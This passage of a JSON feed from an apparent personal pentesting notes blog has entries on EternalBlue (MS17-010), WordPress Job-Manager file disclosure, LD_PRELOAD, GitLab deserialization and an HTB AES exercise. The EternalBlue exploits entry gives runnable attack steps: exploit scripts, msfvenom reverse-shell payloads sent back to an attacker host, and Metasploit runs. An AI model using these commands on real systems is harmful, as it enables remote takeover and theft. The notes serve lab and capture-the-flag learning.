            "title": "Eternal Blue",
            "summary": "Eternal Blue",
            "content_text": "Overview  CVE-2017-0144 (Aka MS17-010)  The eternablue exploit leverages 3 bugs in SMBv1 implementaton to achieve RCE (HandlerFunction is executed which is pointed to shellcode)          Wrong casting bug      Wrong parsing function bug      Non-paged pool allocation bug      How does Eternal Blue works?Eternal Blue relies on a Windows function named srvSrvOS2FeaListSizeToNt. To see how this leads to remote code execution, let’s take a quick look at how SMB works.  Server Message Block  (SMB) operates as an application-layer network protocol mainly used for providing shared access to files, printers, serial ports and miscellaneous communications between nodes on a network.Eternal Blue exploits three bugs:The first bug is a mathematical error when the protocol tries to cast an OS/2  FileExtended Attribute (FEA)  list structure to an NT FEA structure in order to determine how much memory to allocate. A miscalculation creates an integer overflow that causes less memory to be allocated than expected, which in turns leads to a  buffer overflow . With more data than expected being written, the extra data can overflow into adjacent memory space. Triggering the buffer overflow is achieved thanks to the second bug, which results from a difference in the SMB protocol’s definition of two related sub commands: SMB_COM_TRANSACTION2 and SMB_COM_NT_TRANSACT.Both have a _SECONDARY command that is used when there is too much data to include in a single packet. The crucial difference between TRANSACTION2 and NT_TRANSACT is that the latter calls for a data packet twice the size of the former. This is significant because an error in validation occurs if the client sends a crafted message using the NT_TRANSACT sub-command immediately before the TRANSACTION2 one.While the protocol recognizes that two separate sub-commands have been received, it assigns the type and size of both packets (and allocates memory accordingly) based only on the type of the last one received. Since the last one is smaller, the first packet will occupy more space than it is allocated.Once the attackers achieve this initial overflow, they can take advantage of a third bug in SMBv1 which allows  heap spraying , a technique which results in allocating a chunk of memory at a given address. From here, the attacker can write and execute  shellcode  to take control of the system.Wireshark AnalysisAffected Versions  SMBv1  All windows versions prior Windows 8Interesting Files and Directories# list of named pipes you can use/usr/share/metasploit-framework/data/wordlists/named_pipes.txtDetection# nmapnmap -p445 --script smb-vuln-ms17-010 victim.comReferences                              [EternalBlue Exploit          MS17-010 Explained          Avast](https://www.avast.com/c-eternalblue)                      MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption  HTB Blue  EternalBlue – Everything There Is To Know by Check Point Research",
            "content_html": "<h2 id=\"overview\">Overview</h2><p><img src=\"/spindel/assets/Eternal%20Blue/A066602F-25AE-4384-9BA2-438B104D581D.png\" alt=\"\" /></p><p><img src=\"/spindel/assets/Eternal%20Blue/24477296-DE05-4656-AD13-76BDC4551B8A.png\" alt=\"\" /></p><ul>  <li>CVE-2017-0144 (Aka MS17-010)</li>  <li>The eternablue exploit leverages 3 bugs in SMBv1 implementaton to achieve RCE (<code class=\"language-plaintext highlighter-rouge\">HandlerFunction</code> is executed which is pointed to shellcode)    <ul>      <li>Wrong casting bug</li>      <li>Wrong parsing function bug</li>      <li>Non-paged pool allocation bug</li>    </ul>  </li></ul><h2 id=\"how-does-eternal-blue-works\">How does Eternal Blue works?</h2><p>Eternal Blue relies on a Windows function named <code class=\"language-plaintext highlighter-rouge\">srvSrvOS2FeaListSizeToNt</code>. To see how this leads to remote code execution, let’s take a quick look at how SMB works.  <a href=\"https://en.wikipedia.org/wiki/Server_Message_Block\">Server Message Block</a>  (SMB) operates as an application-layer network protocol mainly used for providing shared access to files, printers, serial ports and miscellaneous communications between nodes on a network.</p><p>Eternal Blue exploits three bugs:</p><p>The <strong>first bug</strong> is a mathematical error when the protocol tries to cast an OS/2  <a href=\"https://en.wikipedia.org/wiki/Extended_file_attributes\">FileExtended Attribute (FEA)</a>  list structure to an NT FEA structure in order to determine how much memory to allocate. A miscalculation creates an integer overflow that causes less memory to be allocated than expected, which in turns leads to a  <a href=\"https://en.wikipedia.org/wiki/Buffer_overflow\">buffer overflow</a> . With more data than expected being written, the extra data can overflow into adjacent memory space. Triggering the buffer overflow is achieved thanks to the <strong>second bug</strong>, which results from a difference in the SMB protocol’s definition of two related sub commands: <code class=\"language-plaintext highlighter-rouge\">SMB_COM_TRANSACTION2</code> and <code class=\"language-plaintext highlighter-rouge\">SMB_COM_NT_TRANSACT</code>.</p><p>Both have a <code class=\"language-plaintext highlighter-rouge\">_SECONDARY</code> command that is used when there is too much data to include in a single packet. The crucial difference between <code class=\"language-plaintext highlighter-rouge\">TRANSACTION2</code> and <code class=\"language-plaintext highlighter-rouge\">NT_TRANSACT</code> is that the latter calls for a data packet twice the size of the former. This is significant because an error in validation occurs if the client sends a crafted message using the <code class=\"language-plaintext highlighter-rouge\">NT_TRANSACT</code> sub-command immediately before the <code class=\"language-plaintext highlighter-rouge\">TRANSACTION2</code> one.</p><p>While the protocol recognizes that two separate sub-commands have been received, it assigns the type and size of both packets (and allocates memory accordingly) based only on the type of the last one received. Since the last one is smaller, the first packet will occupy more space than it is allocated.</p><p>Once the attackers achieve this initial overflow, they can take advantage of a <strong>third bug</strong> in SMBv1 which allows  <a href=\"https://andyrussellcronin.wordpress.com/2012/04/13/understanding-heap-spraying/\">heap spraying</a> , a technique which results in allocating a chunk of memory at a given address. From here, the attacker can write and execute  <a href=\"https://en.wikipedia.org/wiki/Shellcode\">shellcode</a>  to take control of the system.</p><h2 id=\"wireshark-analysis\">Wireshark Analysis</h2><p><img src=\"/spindel/assets/Eternal%20Blue/eternablue23.png\" alt=\"\" /></p><h2 id=\"affected-versions\">Affected Versions</h2><ul>  <li>SMBv1</li>  <li>All windows versions prior Windows 8</li></ul><h2 id=\"interesting-files-and-directories\">Interesting Files and Directories</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># list of named pipes you can use</span>/usr/share/metasploit-framework/data/wordlists/named_pipes.txt</code></pre></div></div><h2 id=\"detection\">Detection</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># nmap</span>nmap <span class=\"nt\">-p445</span> <span class=\"nt\">--script</span> smb-vuln-ms17-010 victim.com</code></pre></div></div><h2 id=\"references\">References</h2><ul>  <li>    <table>      <tbody>        <tr>          <td>[EternalBlue Exploit</td>          <td>MS17-010 Explained</td>          <td>Avast](https://www.avast.com/c-eternalblue)</td>        </tr>      </tbody>    </table>  </li>  <li><a href=\"https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/\">MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption</a></li>  <li>HTB Blue</li>  <li><a href=\"https://research.checkpoint.com/2017/eternalblue-everything-know/\">EternalBlue – Everything There Is To Know by Check Point Research</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/04/19/eternal-blue",
            
            
            
            "tags": ["windows","foothold","smb","privesc","rce"],
            
            "date_published": "2022-04-19T00:00:00+08:00",
            "date_modified": "2022-04-19T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/04/18/eternal-blue-exploits",
            "title": "Eternal Blue - Exploits",
            "summary": "Eternal Blue - Exploits",
            "content_text": "Double Pulsar  A sophisticated backdoor implant which serves as a loading dock for other exploits  RAM-resident implant          Removed when system is rebooted?      Once installed on victim system, it can receive additional malwares and remote commands        Can also infect RDP  Here is an example detection script42315.py  Seems not working for windows xp# Get mysmb modulewget https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py# Install dependenciesvirtualenv -p py2 virtualenv_eternalbluesource virtualenv_eternalblue/bin/activatepip install impacketsearchsploit -m 42315.py# Optional - add username pass (use this if# anonymous login doesn't work)(virtualenv_eternalblue) ➜  relevant cat 42315.py| egrep '^(USER|PASS)'USERNAME = 'Bob'PASSWORD = '!P@$$W0rD!123'(virtualenv_eternalblue) ➜  relevant # Runpython 42315.py 10.10.82.5642031.py  Seems not working on windows xp  Also crashes “Windows 7 Professional 7601 Service Pack 1” (HTB Blue)# Setup similar virtualenv with 42315.pysearchsploit -m 42031.py# Update credentials(virtualenv_eternalblue) ➜  relevant cat 42031.py | grep login_standard\tconn.login_standard('Bill', 'Juw4nnaM4n420696969!$$$')(virtualenv_eternalblue) ➜  relevant# Generate shell code filemsfvenom -p windows/shell/reverse_tcp LHOST=10.11.40.33 LPORT=4444 -e x86/shikata_ga_nai -f exe -o eternalblue.exe# Runpython 42031.py 10.10.177.9 eternalblue.exe# NOTE: This doesnt work for windows server 2016Metasploit  Seems the most stable# If victim is vulnerable to ms17-010 eternalblue,# try to use metasploit. NOTE: if this fail on first# time try running it a couple more times.msf&gt; use windows/smb/ms17_010_eternalbluemsf&gt; set rhosts 10.10.10.13msf&gt; set lhost tun0msf&gt; set payload windows/x64/shell/reverse_tcpmsf&gt; run# Try upgrading to meterpreter shellsend_and_execute.py  Versions tested:          Windows 7 Professional 7601 Service Pack 1 (HTB Blue)        Get mysmb.py here  Generate payloadmsfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.51 LPORT=4444 EXITFUNC=thread -f exe -a x86 --platform windows -o ms17-010.exe  Open netcat listener  Run send_and_execute.py. Get it here.python send_and_execute.py legacy ms17-010.exeTroubleshooting  If you get permission errors on named pipes, try changing usernames to \\ and password blanksUSERNAME = '\\\\'PASSWORD = ''References  DoublePulsar – A Very Sophisticated Payload for Windows  Open-Source Command and Control of the DOUBLEPULSAR Implant  MS17-010 Exploits",
            "content_html": "<h2 id=\"double-pulsar\">Double Pulsar</h2><ul>  <li>A sophisticated backdoor implant which serves as a loading dock for other exploits</li>  <li>RAM-resident implant    <ul>      <li>Removed when system is rebooted?</li>      <li>Once installed on victim system, it can receive additional malwares and remote commands</li>    </ul>  </li>  <li>Can also infect RDP</li>  <li>Here is an example <a href=\"https://github.com/countercept/doublepulsar-detection-script\">detection script</a></li></ul><h2 id=\"42315py\">42315.py</h2><ul>  <li>Seems not working for windows xp</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># Get mysmb module</span>wget https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py<span class=\"c\"># Install dependencies</span>virtualenv <span class=\"nt\">-p</span> py2 virtualenv_eternalblue<span class=\"nb\">source </span>virtualenv_eternalblue/bin/activatepip <span class=\"nb\">install </span>impacketsearchsploit <span class=\"nt\">-m</span> 42315.py<span class=\"c\"># Optional - add username pass (use this if</span><span class=\"c\"># anonymous login doesn't work)</span><span class=\"o\">(</span>virtualenv_eternalblue<span class=\"o\">)</span> ➜  relevant <span class=\"nb\">cat </span>42315.py| egrep <span class=\"s1\">'^(USER|PASS)'</span>USERNAME <span class=\"o\">=</span> <span class=\"s1\">'Bob'</span>PASSWORD <span class=\"o\">=</span> <span class=\"s1\">'!P@$$W0rD!123'</span><span class=\"o\">(</span>virtualenv_eternalblue<span class=\"o\">)</span> ➜  relevant <span class=\"c\"># Run</span>python 42315.py 10.10.82.56</code></pre></div></div><h2 id=\"42031py\">42031.py</h2><ul>  <li>Seems not working on windows xp</li>  <li>Also crashes “Windows 7 Professional 7601 Service Pack 1” (HTB Blue)</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># Setup similar virtualenv with 42315.py</span>searchsploit <span class=\"nt\">-m</span> 42031.py<span class=\"c\"># Update credentials</span><span class=\"o\">(</span>virtualenv_eternalblue<span class=\"o\">)</span> ➜  relevant <span class=\"nb\">cat </span>42031.py | <span class=\"nb\">grep </span>login_standard\tconn.login_standard<span class=\"o\">(</span><span class=\"s1\">'Bill'</span>, <span class=\"s1\">'Juw4nnaM4n420696969!$$$'</span><span class=\"o\">)</span><span class=\"o\">(</span>virtualenv_eternalblue<span class=\"o\">)</span> ➜  relevant<span class=\"c\"># Generate shell code file</span>msfvenom <span class=\"nt\">-p</span> windows/shell/reverse_tcp <span class=\"nv\">LHOST</span><span class=\"o\">=</span>10.11.40.33 <span class=\"nv\">LPORT</span><span class=\"o\">=</span>4444 <span class=\"nt\">-e</span> x86/shikata_ga_nai <span class=\"nt\">-f</span> exe <span class=\"nt\">-o</span> eternalblue.exe<span class=\"c\"># Run</span>python 42031.py 10.10.177.9 eternalblue.exe<span class=\"c\"># NOTE: This doesnt work for windows server 2016</span></code></pre></div></div><h2 id=\"metasploit\">Metasploit</h2><ul>  <li>Seems the most stable</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># If victim is vulnerable to ms17-010 eternalblue,</span><span class=\"c\"># try to use metasploit. NOTE: if this fail on first</span><span class=\"c\"># time try running it a couple more times.</span>msf&gt; use windows/smb/ms17_010_eternalbluemsf&gt; <span class=\"nb\">set </span>rhosts 10.10.10.13msf&gt; <span class=\"nb\">set </span>lhost tun0msf&gt; <span class=\"nb\">set </span>payload windows/x64/shell/reverse_tcpmsf&gt; run<span class=\"c\"># Try upgrading to meterpreter shell</span></code></pre></div></div><h2 id=\"send_and_executepy\">send_and_execute.py</h2><ul>  <li>Versions tested:    <ul>      <li>Windows 7 Professional 7601 Service Pack 1 (HTB Blue)</li>    </ul>  </li>  <li>Get <code class=\"language-plaintext highlighter-rouge\">mysmb.py</code> <a href=\"https://github.com/worawit/MS17-010/blob/master/mysmb.py\">here</a></li>  <li>Generate payload</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>msfvenom <span class=\"nt\">-p</span> windows/shell_reverse_tcp <span class=\"nv\">LHOST</span><span class=\"o\">=</span>10.10.14.51 <span class=\"nv\">LPORT</span><span class=\"o\">=</span>4444 <span class=\"nv\">EXITFUNC</span><span class=\"o\">=</span>thread <span class=\"nt\">-f</span> exe <span class=\"nt\">-a</span> x86 <span class=\"nt\">--platform</span> windows <span class=\"nt\">-o</span> ms17-010.exe</code></pre></div></div><ul>  <li>Open netcat listener</li>  <li>Run <code class=\"language-plaintext highlighter-rouge\">send_and_execute.py</code>. Get it <a href=\"https://github.com/helviojunior/MS17-010\">here</a>.</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>python send_and_execute.py legacy ms17-010.exe</code></pre></div></div><h2 id=\"troubleshooting\">Troubleshooting</h2><ul>  <li>If you get permission errors on named pipes, try changing usernames to <code class=\"language-plaintext highlighter-rouge\">\\</code> and password blanks</li></ul><div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"n\">USERNAME</span> <span class=\"o\">=</span> <span class=\"s\">'</span><span class=\"se\">\\\\</span><span class=\"s\">'</span><span class=\"n\">PASSWORD</span> <span class=\"o\">=</span> <span class=\"s\">''</span></code></pre></div></div><h2 id=\"references\">References</h2><ul>  <li><a href=\"https://www.secpod.com/blog/doublepulsar-a-very-sophisticated-payload-for-windows/\">DoublePulsar – A Very Sophisticated Payload for Windows</a></li>  <li><a href=\"https://www.rapid7.com/blog/post/2019/10/02/open-source-command-and-control-of-the-doublepulsar-implant/\">Open-Source Command and Control of the DOUBLEPULSAR Implant</a></li>  <li><a href=\"https://github.com/worawit/MS17-010\">MS17-010 Exploits</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/04/18/eternal-blue-exploits",
            
            
            
            "tags": ["windows","foothold","smb","privesc"],
            
            "date_published": "2022-04-18T00:00:00+08:00",
            "date_modified": "2022-04-18T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/04/17/wordpress-jobmanager-plugin-file-disclosure",
            "title": "Wordpress Job-Manager Plugin File Disclosure",
            "summary": "Wordpress Job-Manager Plugin File Disclosure",
            "content_text": "OverviewVulnerable versions of job-manager plugin can allow attacker to retrieve confidential files such as CV.CVE-2015-6668Environment Setup  Wordpress running job manager plugin 0.7.25.Steps  Check what available are the available job titlesfor i in $(seq 1 25); do echo -n \"$i: \"; curl -s http://tenten/index.php/jobs/apply/$i/ | grep 'entry-title' | cut -d'&gt;' -f2 | cut -d'&lt;' -f1; done  Using this script, brute force the possible files you can retrieve from the uploads directory➜  exploit python2 brute.py/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.CVE-2015-6668Title: CV filename disclosure on Job-Manager WP PluginBlog: https://vagmour.euPlugin URL: http://www.wp-jobmanager.comVersions: &lt;=0.7.25Enter a vulnerable website: http://tentenEnter a file name: HackerAccessGranted[+] URL of CV found! http://tenten/wp-content/uploads/2017/04/HackerAccessGranted.jpg➜  exploit References  HTB Tenten",
            "content_html": "<h2 id=\"overview\">Overview</h2><p>Vulnerable versions of job-manager plugin can allow attacker to retrieve confidential files such as CV.</p><p>CVE-2015-6668</p><h2 id=\"environment-setup\">Environment Setup</h2><ul>  <li>Wordpress running job manager plugin 0.7.25.</li></ul><h2 id=\"steps\">Steps</h2><ul>  <li>Check what available are the available job titles</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"k\">for </span>i <span class=\"k\">in</span> <span class=\"si\">$(</span><span class=\"nb\">seq </span>1 25<span class=\"si\">)</span><span class=\"p\">;</span> <span class=\"k\">do </span><span class=\"nb\">echo</span> <span class=\"nt\">-n</span> <span class=\"s2\">\"</span><span class=\"nv\">$i</span><span class=\"s2\">: \"</span><span class=\"p\">;</span> curl <span class=\"nt\">-s</span> http://tenten/index.php/jobs/apply/<span class=\"nv\">$i</span>/ | <span class=\"nb\">grep</span> <span class=\"s1\">'entry-title'</span> | <span class=\"nb\">cut</span> <span class=\"nt\">-d</span><span class=\"s1\">'&gt;'</span> <span class=\"nt\">-f2</span> | <span class=\"nb\">cut</span> <span class=\"nt\">-d</span><span class=\"s1\">'&lt;'</span> <span class=\"nt\">-f1</span><span class=\"p\">;</span> <span class=\"k\">done</span></code></pre></div></div><ul>  <li>Using this <a href=\"https://github.com/1nf1n17yk1ng/CVE-2015-6668\">script</a>, brute force the possible files you can retrieve from the uploads directory</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>➜  exploit python2 brute.py/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support <span class=\"k\">for </span>it is now deprecated <span class=\"k\">in </span>cryptography, and will be removed <span class=\"k\">in </span>the next release.CVE-2015-6668Title: CV filename disclosure on Job-Manager WP PluginBlog: https://vagmour.euPlugin URL: http://www.wp-jobmanager.comVersions: &lt;<span class=\"o\">=</span>0.7.25Enter a vulnerable website: http://tentenEnter a file name: HackerAccessGranted<span class=\"o\">[</span>+] URL of CV found! http://tenten/wp-content/uploads/2017/04/HackerAccessGranted.jpg➜  exploit </code></pre></div></div><h2 id=\"references\">References</h2><ul>  <li>HTB Tenten</li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/04/17/wordpress-jobmanager-plugin-file-disclosure",
            
            
            
            "tags": ["foothold","wordpress","web"],
            
            "date_published": "2022-04-17T00:00:00+08:00",
            "date_modified": "2022-04-17T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/04/16/ld-preload",
            "title": "LD_PRELOAD",
            "summary": "LD_PRELOAD",
            "content_text": "Overview  Allows you to load any libraries before loading actual libraries needed by the app  Can be set via LD_PRELOAD environment variable or on /etc/ld.so.preloadTools  FatherExample exploits leveraging this technique  GNU Screen 4.5.0 - Local Privilege EscalationReferences  https://securityboulevard.com/2020/10/not-so-random-using-ld_preload-to-hijack-the-rand-function/  Linux Privilege Escalation using LD_Preload",
            "content_html": "<h2 id=\"overview\">Overview</h2><ul>  <li>Allows you to load any libraries before loading actual libraries needed by the app</li>  <li>Can be set via <code class=\"language-plaintext highlighter-rouge\">LD_PRELOAD</code> environment variable or on <code class=\"language-plaintext highlighter-rouge\">/etc/ld.so.preload</code></li></ul><h2 id=\"tools\">Tools</h2><ul>  <li><a href=\"https://github.com/mav8557/Father?fbclid=IwAR2_dWGrUAHhfMOtMP9ovuXw4Hp7xCdm4DHWay99AObhaG5zuCrJAsZbHjE\">Father</a></li></ul><h2 id=\"example-exploits-leveraging-this-technique\">Example exploits leveraging this technique</h2><ul>  <li><a href=\"https://www.exploit-db.com/exploits/41154\">GNU Screen 4.5.0 - Local Privilege Escalation</a></li></ul><h2 id=\"references\">References</h2><ul>  <li>https://securityboulevard.com/2020/10/not-so-random-using-ld_preload-to-hijack-the-rand-function/</li>  <li><a href=\"https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/\">Linux Privilege Escalation using LD_Preload</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/04/16/ld-preload",
            
            
            
            "tags": ["linux","privesc"],
            
            "date_published": "2022-04-16T00:00:00+08:00",
            "date_modified": "2022-04-16T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/04/15/gitlab-lfi-and-cookie-deserialization",
            "title": "Gitlab LFI and Cookie Deserialization",
            "summary": "Gitlab LFI and Cookie Deserialization",
            "content_text": "OverviewAttacker can get secret_key_base from /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml and use that to generate a shell payload that can be converted into an RCE via cookie deserailization attack.Requirements and Environment Setup  Valid accountVersions Affected  Gitlab 12.8.1Troubleshooting  Be sure to add /users/sign_in on the target url  If user has a max limit of 1 project only, this exploit is not possibleReferences  HackerOne  GitHub - leecybersec/gitlab-rce",
            "content_html": "<h2 id=\"overview\">Overview</h2><p>Attacker can get <code class=\"language-plaintext highlighter-rouge\">secret_key_base</code> from <code class=\"language-plaintext highlighter-rouge\">/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml</code> and use that to generate a shell payload that can be converted into an RCE via cookie deserailization attack.</p><h2 id=\"requirements-and-environment-setup\">Requirements and Environment Setup</h2><ul>  <li>Valid account</li></ul><h2 id=\"versions-affected\">Versions Affected</h2><ul>  <li>Gitlab 12.8.1</li></ul><h2 id=\"troubleshooting\">Troubleshooting</h2><ul>  <li>Be sure to add <code class=\"language-plaintext highlighter-rouge\">/users/sign_in</code> on the target url</li>  <li>If user has a max limit of 1 project only, this exploit is not possible</li></ul><h2 id=\"references\">References</h2><ul>  <li><a href=\"https://hackerone.com/reports/827052\">HackerOne</a></li>  <li><a href=\"https://github.com/leecybersec/gitlab-rce\">GitHub - leecybersec/gitlab-rce</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/04/15/gitlab-lfi-and-cookie-deserialization",
            
            
            
            "tags": ["git","deserial","foothold","rce","lfi"],
            
            "date_published": "2022-04-15T00:00:00+08:00",
            "date_modified": "2022-04-15T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/04/12/python-aes-encryption-and-decryption",
            "title": "Python AES Encryption and Decryption",
            "summary": "Python AES Encryption and Decryption",
            "content_text": "OverviewHere is an example steps on how to decrypt a file using AES by creating a decryption program based from the given encryption program.StepsIn this box, there is a mail attachment (en.py) containing parts of the code that was used to encrypt a message which is another attachment (enim_msg.txt) on the email.def encrypt(key, filename):    chunksize = 64*1024    outputFile = \"en\" + filename    filesize = str(os.path.getsize(filename)).zfill(16)    IV =Random.new().read(16)    encryptor = AES.new(key, AES.MODE_CBC, IV)    with open(filename, 'rb') as infile:        with open(outputFile, 'wb') as outfile:            outfile.write(filesize.encode('utf-8'))            outfile.write(IV)            while True:                chunk = infile.read(chunksize)                if len(chunk) == 0:                    break                elif len(chunk) % 16 != 0:                    chunk += b' ' * (16 - (len(chunk) % 16))                outfile.write(encryptor.encrypt(chunk))def getKey(password):            hasher = SHA256.new(password.encode('utf-8'))            return hasher.digest()Obviously we need to modify this code to work properly. For example, the imports are missing. But before that, I tried to inspect the other attachment on how does it look like internally. I confirmed that the content is unreadable even when viewing in xxd.$ file enim_msg.txt enim_msg.txt: data$ strings enim_msg.txt 0000000000000234YDo!$ Going back to the python code above, by doing static analysis, I can confirm that it accepts an input password, then that password is turned into a SHA256 hash, then the hashed password is used as a key for AES CBC mode. The encryption is also done in 65536 bytes chunk as per chunksize = 64*1024 and put it into a file. At the beginning of the encrypted file, the program also put first the filesize with 0 paddings and IV, not sure though what’s the purpose of this.I wanted to confirm my anlysis above so I modified the code and test by encrypting a file. The completed code now looks like:#!/usr/bin/env python3import sys, osfrom Crypto.Hash import SHA256from Crypto import Randomfrom Crypto.Cipher import AESPASSWORD = sys.argv[1]FILENAME = sys.argv[2]def encrypt(key, filename):    chunksize = 64*1024    outputFile = \"en\" + filename    filesize = str(os.path.getsize(filename)).zfill(16)    IV =Random.new().read(16)    print(IV)    encryptor = AES.new(key, AES.MODE_CBC, IV)    with open(filename, 'rb') as infile:        with open(outputFile, 'wb') as outfile:            outfile.write(filesize.encode('utf-8'))            outfile.write(IV)            while True:                chunk = infile.read(chunksize)                if len(chunk) == 0:                    break                elif len(chunk) % 16 != 0:                    chunk += b' ' * (16 - (len(chunk) % 16))                outfile.write(encryptor.encrypt(chunk))def getKey(password):            hasher = SHA256.new(password.encode('utf-8'))            return hasher.digest()encrypt(getKey(PASSWORD), FILENAME)I tried to create a test file, encrypt it using the new code, and compared the  encrypted file to the mail attachment.# create test fileecho hello &gt; test.txt# encrypt file using new code./en.py pass123 test.txt# compare encrypted file to the encrypted attachment$ strings enim_msg.txt 0000000000000234YDo!$ strings entest.txt 0000000000000006$ There is a slight difference, I only see the filesize with paddings on the strings output. But anyway, looks like we are on correct track.The next step I decided is to start building the decryption program based from the encryption program. Its almost similar to the encryption program with few differences:  Use decryptor.decrypt instead of decryptor.encrypt  I removed the writing of IV and filesize with padding on the output file  Some variable changes#!/usr/bin/env python3import sys, osfrom Crypto.Hash import SHA256from Crypto import Randomfrom Crypto.Cipher import AESPASSWORD = sys.argv[1]FILENAME = sys.argv[2]def decrypt(key, filename):  chunksize = 64*1024  outputFile = \"de\" + filename   filesize = str(os.path.getsize(filename)).zfill(16)  IV =Random.new().read(16)  decryptor = AES.new(key, AES.MODE_CBC, IV)  with open(filename, 'rb') as infile:    with open(outputFile, 'wb') as outfile:      # outfile.write(filesize.encode('utf-8'))      # outfile.write(IV)      while True:        chunk = infile.read(chunksize)        if len(chunk) == 0:            break        elif len(chunk) % 16 != 0:            chunk += b' ' * (16 - (len(chunk) % 16))        outfile.write(decryptor.decrypt(chunk))              def getKey(password):  hasher = SHA256.new(password.encode('utf-8'))  return hasher.digest()decrypt(getKey(PASSWORD), FILENAME)I tried to run this against the decrypted test file I created and I was able to get the original data.$ ./de.py pass123 entest.txt  $ cat deentest.txtk�Y���W3�B}���s�H                 {P��O*:hello          %                                                                                                  $ $ strings deentest.txt            O*:hello          $ I was able to see the original data but there is some garbage. I’m sure I needed to do some changes on the decryption program but not sure on what part.Having this problem, I tried first to use the decryption program against the encrypted attachment. Luckily, I know the password used because it was mentioned on the email body - it was same as the name of the recipient which is sahay.$ ./de.py sahay enim_msg.txt$ strings deenim_msg.txt            sLPOSGlpIFNhaGF5CgpQbGVhc2UgY2hlY2sgb3VyIG5ldyBzZXJ2aWNlIHdoaWNoIGNyZWF0ZSBwZGYKCnAucyAtIEFzIHlvdSB0b2xkIG1lIHRvIGVuY3J5cHQgaW1wb3J0YW50IG1zZywgaSBkaWQgOikKCmh0dHA6Ly9jaGFvcy5odGIvSjAwX3cxbGxfZjFOZF9uMDdIMW45X0gzcjMKClRoYW5rcywKQXl1c2gK      $ Doing a quick look at cyberchef using magic recipe, this is what I uncovered.Better solutionI checked how different people did it. Here is from the official HTB walkthrough.References  Looks like this is the original code where the program was based on",
            "content_html": "<h2 id=\"overview\">Overview</h2><p>Here is an example steps on how to decrypt a file using AES by creating a decryption program based from the given encryption program.</p><h2 id=\"steps\">Steps</h2><p>In this box, there is a mail attachment (<code class=\"language-plaintext highlighter-rouge\">en.py</code>) containing parts of the code that was used to encrypt a message which is another attachment (<code class=\"language-plaintext highlighter-rouge\">enim_msg.txt</code>) on the email.</p><div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"k\">def</span> <span class=\"nf\">encrypt</span><span class=\"p\">(</span><span class=\"n\">key</span><span class=\"p\">,</span> <span class=\"n\">filename</span><span class=\"p\">):</span>    <span class=\"n\">chunksize</span> <span class=\"o\">=</span> <span class=\"mi\">64</span><span class=\"o\">*</span><span class=\"mi\">1024</span>    <span class=\"n\">outputFile</span> <span class=\"o\">=</span> <span class=\"s\">\"en\"</span> <span class=\"o\">+</span> <span class=\"n\">filename</span>    <span class=\"n\">filesize</span> <span class=\"o\">=</span> <span class=\"nb\">str</span><span class=\"p\">(</span><span class=\"n\">os</span><span class=\"p\">.</span><span class=\"n\">path</span><span class=\"p\">.</span><span class=\"n\">getsize</span><span class=\"p\">(</span><span class=\"n\">filename</span><span class=\"p\">)).</span><span class=\"n\">zfill</span><span class=\"p\">(</span><span class=\"mi\">16</span><span class=\"p\">)</span>    <span class=\"n\">IV</span> <span class=\"o\">=</span><span class=\"n\">Random</span><span class=\"p\">.</span><span class=\"n\">new</span><span class=\"p\">().</span><span class=\"n\">read</span><span class=\"p\">(</span><span class=\"mi\">16</span><span class=\"p\">)</span>    <span class=\"n\">encryptor</span> <span class=\"o\">=</span> <span class=\"n\">AES</span><span class=\"p\">.</span><span class=\"n\">new</span><span class=\"p\">(</span><span class=\"n\">key</span><span class=\"p\">,</span> <span class=\"n\">AES</span><span class=\"p\">.</span><span class=\"n\">MODE_CBC</span><span class=\"p\">,</span> <span class=\"n\">IV</span><span class=\"p\">)</span>    